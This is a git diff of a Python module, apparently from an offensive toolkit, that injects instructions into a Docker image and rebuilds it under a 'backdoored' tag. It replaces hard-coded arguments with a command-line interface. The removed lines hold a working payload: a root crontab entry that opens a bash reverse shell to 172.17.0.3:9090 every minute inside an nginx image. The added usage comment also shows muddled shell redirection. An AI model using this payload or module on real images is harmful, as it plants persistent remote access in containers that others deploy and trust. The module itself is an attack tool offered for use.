@@ -1,5 +1,7 @@
-import docker
 from io import BytesIO
+import sys
+
+import docker, fire
 
 
 module_info = {
@@ -50,7 +52,7 @@ def main(args):
         data['count'] = 1
         
     except Exception as e:
-        print(e)
+        print(e, file=sys.stderr)
 
     return data
 
@@ -60,17 +62,32 @@ def summary(data):
     return out
 
 
+def set_args(repository_uri, target_image_tag, build_image_tag, injection):
+    args = {
+        'repository_uri': repository_uri,
+        'target_image_tag': target_image_tag,
+        'build_image_tag':build_image_tag,
+        'injection': injection
+    }
+
+    return args
+
+
+# Run it with sdtin, sdtout, sdterr
+#   standard input	0<
+#   standard output	1>
+#   standard error	2>
+#
+#   Example:
+        # python ./modules/docker__backdoor/main.py \
+        # 0> echo nginx latest backdoored 'RUN echo haha > ccat2.txt' \
+        # 2> docker_err.txt \
+        # 1> docker_out.txt
 if __name__ == "__main__":
     print('Running module {}...'.format(module_info['name']))
 
-    args = {
-        'repository_uri': 'nginx',
-        'target_image_tag': 'latest',
-        'build_image_tag':'backdoored',
-        'injection': 'RUN apt-get update && apt-get -y install cron && echo "* * * * * root bash -c \'bash -i >& /dev/tcp/172.17.0.3/9090 0>&1\'" >> /etc/crontab && echo "" >> /etc/crontab\nCMD cron && nginx -g \'daemon off;\''
-    }
-
-    data = main(args) 
+    args= fire.Fire(set_args)
+    data = main(args)
 
     if data is not None:
         summary = summary(data)
